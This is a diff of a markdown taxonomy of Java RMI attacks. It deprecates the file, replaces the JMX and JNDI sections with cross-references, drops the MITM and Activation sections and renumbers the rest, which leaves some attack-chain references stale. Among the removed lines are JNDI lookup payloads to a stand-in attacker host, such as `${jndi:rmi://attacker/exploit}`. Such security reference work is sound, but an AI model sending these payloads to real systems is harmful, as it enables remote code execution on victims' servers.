@@ -1,3 +1,8 @@
+> **DEPRECATED** — Moved to `99-deprecated/`.
+> - Java RMI is a legacy protocol; ~90% of this document covers deserialization variants already in `deserialization.md`
+> - Registry/DGC attacks and JEP 290 bypasses can be consolidated into the deserialization document's Java-specific sections
+> - Direct RMI exposure in modern environments is extremely rare
+
 # Java RMI (Remote Method Invocation) Vulnerability Mutation Taxonomy
 
 ---
@@ -123,44 +128,13 @@ Certain well-known RMI services are inherently dangerous when exposed.
 
 ## §4. JMX over RMI Attacks
 
-Java Management Extensions (JMX) is a standard Java management framework that commonly uses RMI as its transport layer. JMX-RMI endpoints (typically port 1099 or dynamically assigned) represent one of the most dangerous RMI attack surfaces due to the inherent power of the MBeanServer.
-
-### §4-1. Unauthenticated JMX Exploitation
-
-| Subtype | Mechanism | Key Condition |
-|---------|-----------|---------------|
-| **MLet Remote MBean Loading** | Create a `javax.management.loading.MLet` MBean, then invoke `getMBeansFromURL()` pointing to an attacker-controlled HTTP server hosting a malicious MLet file that references a JAR with a weaponized MBean | `com.sun.management.jmxremote.authenticate=false`; no SecurityManager restricting ClassLoader MBeans |
-| **Direct MBean Invocation** | Invoke dangerous methods on already-registered MBeans (e.g., `Runtime.exec()` via a wrapper MBean, or `DiagnosticCommand` MBean for JVM commands) | JMX authentication disabled; certain MBeans (like `com.sun.management:type=DiagnosticCommand`) are always present |
-| **MBean Attribute Manipulation** | Modify MBean attributes to alter application behavior — change logging levels, modify connection pool settings, disable security features | JMX exposed without authentication |
-
-### §4-2. Authenticated JMX Exploitation
-
-| Subtype | Mechanism | Key Condition |
-|---------|-----------|---------------|
-| **Default/Weak JMX Credentials** | JMX authentication uses a password file (`jmxremote.password`); many deployments use default credentials or easily guessable passwords | Authentication enabled but with weak credentials |
-| **JMX Deserialization** | Even authenticated JMX communication uses Java serialization. If an attacker can authenticate (or MITM the connection), they can inject gadget chains | Valid credentials or network position for MITM; no TLS on JMX connection |
+> **Cross-reference**: Full JMX attack taxonomy including MLet loading, MBean invocation, and authenticated exploitation is covered in **[jmx-attack.md](jmx-attack.md)**. This section is retained only to note that RMI is the default transport for JMX remote connectors.
 
 ---
 
 ## §5. JNDI Injection via RMI Vector
 
-Java Naming and Directory Interface (JNDI) is a general-purpose lookup API. When JNDI is configured to use RMI as a naming provider, several injection attacks become possible. This category gained massive prominence through Log4Shell (CVE-2021-44228).
-
-### §5-1. JNDI Reference Injection (Classic)
-
-| Subtype | Mechanism | Key Condition |
-|---------|-----------|---------------|
-| **Remote Factory Class Loading** | Attacker controls a JNDI lookup URL (`rmi://attacker:1099/exploit`). The attacker's RMI server returns a `javax.naming.Reference` with a `classFactory` and `classFactoryLocation` pointing to an attacker-controlled HTTP server. The victim downloads and instantiates the factory class, achieving RCE | JDK < 8u121 (no `com.sun.jndi.rmi.object.trustURLCodebase` restriction) |
-| **Local Factory Abuse (Post-8u191)** | After Oracle restricted remote codebase loading, attackers instead specify a factory class already present on the victim's classpath. For example, `org.apache.xbean.propertyeditor.JndiConverter` (Tomcat) or `com.sun.rowset.JdbcRowSetImpl` can be abused as local factories | JDK ≥ 8u191; requires a suitable factory class on the target classpath (Tomcat's `BeanFactory` is the most common) |
-| **Serialized Object in Reference** | Instead of using a factory, the attacker's RMI server returns a `Reference` containing a serialized Java object in its attributes. The victim deserializes this object, enabling gadget chain execution | Gadget libraries on the victim's classpath; works regardless of codebase restrictions |
-
-### §5-2. JNDI Injection Entry Points
-
-| Subtype | Mechanism | Key Condition |
-|---------|-----------|---------------|
-| **Log4Shell (CVE-2021-44228)** | Log4j 2.x's message lookup feature evaluates `${jndi:rmi://attacker/exploit}` expressions embedded in logged strings, triggering JNDI lookups to attacker-controlled RMI servers | Log4j 2.0–2.14.1; any log input that reaches a vulnerable `Logger.log()` call |
-| **Application-Level JNDI Lookup** | Any code path where user input reaches `InitialContext.lookup()` — common in JDBC DataSource configuration, JMS queue resolution, EJB lookups, and Spring JNDI configuration | Application passes attacker-controlled strings to JNDI lookup |
-| **RMI-to-LDAP Redirection** | An attacker's malicious RMI server redirects the JNDI lookup to an LDAP server, which has different (sometimes weaker) restrictions on returned objects | JNDI's multi-protocol nature allows protocol switching during lookup resolution |
+> **Cross-reference**: Full JNDI injection taxonomy including Reference injection, local factory abuse, Log4Shell, and post-JDK-8u191 bypasses is covered in **[jndi-injection.md](../04-server-side/jndi-injection.md)**. RMI serves as one of three JNDI naming providers (alongside LDAP and CORBA).
 
 ---
 
@@ -197,15 +171,7 @@ Beyond application-level vulnerabilities, the JRMP protocol and its network tran
 | **Registry Enumeration via SSRF** | Use SSRF to call `list()` on an internal RMI registry, revealing bound names and endpoints on the internal network | SSRF vulnerability; internal RMI registry on a known port |
 | **SSRF Response Parsing** | After sending an SSRF-based RMI call, parse the SSRF response to extract serialized return values, including remote object stubs with internal endpoint information | SSRF vulnerability that returns response data |
 
-### §7-2. Man-in-the-Middle (MITM) Attacks
-
-| Subtype | Mechanism | Key Condition |
-|---------|-----------|---------------|
-| **Unencrypted JRMP Interception** | RMI communication over JRMP is unencrypted by default. An attacker with network access can intercept and modify serialized objects in transit — injecting gadget chains into method arguments or return values | No TLS/SSL configured for RMI; attacker has network-level access (ARP spoofing, compromised router, etc.) |
-| **Object Replacement** | Intercept a legitimate RMI response and replace the returned object with a malicious serialized payload. The client deserializes the attacker's object thinking it came from the legitimate server | Unencrypted RMI; client does not validate response integrity |
-| **Registry Spoofing** | Set up a rogue RMI registry that responds to `lookup()` calls with malicious stubs containing embedded gadget chains or codebases pointing to attacker-controlled servers | DNS spoofing or network position to redirect registry connections; no TLS on registry communication |
-
-### §7-3. RMI-IIOP Specific Attacks
+### §7-2. RMI-IIOP Specific Attacks
 
 | Subtype | Mechanism | Key Condition |
 |---------|-----------|---------------|
@@ -215,25 +181,11 @@ Beyond application-level vulnerabilities, the JRMP protocol and its network tran
 
 ---
 
-## §8. RMI Activation System Attacks
-
-The RMI Activation System (`rmid`) manages activatable remote objects — objects that can be started on demand. While deprecated since JDK 15 and removed in JDK 17, it remains present in many legacy deployments.
-
-### §8-1. Activator Exploitation
-
-| Subtype | Mechanism | Key Condition |
-|---------|-----------|---------------|
-| **Activator Deserialization** | The Activator (ObjID `[0:0:0, 1]`) accepts serialized `ActivationID` objects. On pre-JEP 290 systems, these can contain gadget chains | Pre-JEP 290 JDK; Activation System running |
-| **Activation Descriptor Injection** | Register a malicious `ActivationDesc` that specifies an attacker-controlled codebase URL. When the activation system starts the object, it loads classes from the attacker's server | Ability to register activation descriptors (requires access to `ActivationSystem`) |
-| **Activation Group Manipulation** | Create or modify an `ActivationGroupDesc` to change JVM arguments, system properties, or classpath of the activation group's JVM, potentially disabling security features | Access to `ActivationSystem`; no authentication on activation operations |
-
----
-
-## §9. Reconnaissance and Enumeration
+## §8. Reconnaissance and Enumeration
 
 Reconnaissance is a prerequisite for most RMI attacks. This category covers techniques for discovering and fingerprinting RMI services.
 
-### §9-1. Service Discovery
+### §8-1. Service Discovery
 
 | Subtype | Mechanism | Key Condition |
 |---------|-----------|---------------|
@@ -241,7 +193,7 @@ Reconnaissance is a prerequisite for most RMI attacks. This category covers tech
 | **Registry Enumeration** | Calling `list()` on the RMI registry reveals all bound names, their implementing classes/interfaces, and endpoint addresses (IP:port) of the backing remote objects | Default RMI registry has no access control on `list()` |
 | **JDK Version Fingerprinting** | ObjID structure, error messages, and protocol behavior differ across JDK versions, allowing determination of whether JEP 290 filters, codebase restrictions, or other mitigations are present | Any accessible RMI endpoint |
 
-### §9-2. Detailed Fingerprinting
+### §8-2. Detailed Fingerprinting
 
 | Subtype | Mechanism | Key Condition |
 |---------|-----------|---------------|
@@ -262,7 +214,7 @@ Reconnaissance is a prerequisite for most RMI attacks. This category covers tech
 | **JMX-based RCE** | JMX exposed without authentication | §4-1 (MLet loading) |
 | **JNDI Injection Chain** | Application with JNDI lookup sink | §5-1 + §5-2 |
 | **SSRF-to-Internal-RMI** | Web app SSRF + internal RMI services | §7-1 + §2-2 |
-| **Lateral Movement** | Compromised host in RMI-using environment | §9-1 → §3 or §4 |
+| **Lateral Movement** | Compromised host in RMI-using environment | §8-1 → §3 or §4 |
 | **Supply Chain / Build System** | CI/CD using JMeter/Gradle/Maven with RMI | §3-3 + §6 |
 | **Client-Side Exploitation** | Attacker controls RMI server, victim is client | §6-2 + §7-2 |
 | **Persistence via Registry** | Attacker has write access to registry | §1-1 (rebind malicious stubs) + §6-2 |
